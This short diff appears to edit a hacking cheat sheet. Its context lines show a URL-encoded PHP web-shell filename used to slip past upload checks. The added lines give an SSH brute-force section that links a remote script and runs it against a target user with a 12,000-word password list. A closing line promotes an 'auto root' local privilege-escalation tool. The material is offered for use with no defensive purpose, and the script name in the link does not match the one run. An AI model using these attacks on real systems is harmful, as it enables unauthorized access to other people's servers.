@@ -38,4 +38,12 @@ Content-Type: multipart/form-data; boundary=---------------------------123456789
 ```
 shell%2Ephp
 ```
+```
+#Brute Force Ssh
+'''
+'''
+https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/bfssh.sh
+
+./entod.sh -u targetuser -t 0.5 -s 0.003 -w top12000.txt
+```
 ☠️ Powerfull Auto root Localroot By Ghost haxor | Mr.W4W4N ☠️
